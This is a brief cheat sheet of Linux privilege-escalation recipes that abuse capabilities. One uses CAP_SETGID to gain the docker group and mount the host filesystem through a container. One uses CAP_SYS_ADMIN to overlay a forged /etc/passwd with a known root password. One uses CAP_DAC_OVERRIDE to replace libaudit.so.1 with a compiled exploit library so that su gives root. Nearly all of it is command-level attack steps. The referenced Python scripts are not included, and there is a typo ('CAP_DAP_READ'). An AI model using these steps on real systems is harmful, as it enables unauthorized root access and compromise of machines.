# CAP_SETGID python

- cat /etc/group
- select docker group id
- use `setgid.py <dockergroupid>`
- finally `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

# CAP_SYS_ADMIN python

cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
run cap_sysadmin.py
su root
password

# CAP_DAC_OVERRIDE ld.bfd

- getcap -r / 2>/dev/null
- capsh --print
  - If CAP_DAP_READ is set continue
- find / -perm -04000 -ls 2>/dev/null
- if /bin/su in the list continue
- ldd /bin/su
- objdump -T /bin/su | grep audit
- if "audit_open", "audit_log_user_message" or "audit_log_user_commands" in the output continue
- if /lib/x86_64-linux-gnu/libaudit.so.1 in the list continue
- compile basic privesc C program
- gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC exploit.c
- su

Now you can run commands as root
